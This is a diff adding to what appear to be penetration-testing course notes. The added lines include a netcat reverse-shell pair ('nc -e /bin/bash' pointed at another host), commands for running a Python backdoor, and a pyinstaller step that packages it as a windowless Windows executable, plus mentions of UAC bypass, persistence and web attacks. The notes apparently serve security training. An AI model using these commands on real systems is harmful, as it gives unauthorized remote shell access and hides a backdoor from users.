@@ -44,6 +44,12 @@ msf6 > sessions
 msf6 > sessions -i <id>
 ```
 * netcat
+```
+# Server
+$ nc -lvp 12345
+# Client
+$ nc -e /bin/bash 192.168.1.9 12345
+```
 * telnet
 * search routersploit
 
@@ -85,3 +91,24 @@ msf6 > search bypassuac
 ```
 msf6 > search persistence
 ```
+
+## Section 12: Python Coding Project #2 - Backdoor
+* run at server
+```
+$ python3 server.py
+```
+* run at client
+```
+$ python3 backdoor.py
+```
+* Compile to window exe file
+```
+$ pyinstaller backdoor.py --onefile --noconsole
+```
+
+## Section 13: Website Application Penetration Testing
+* dirb
+* burpsuite
+* ShellShock
+* Command Injection
+* 
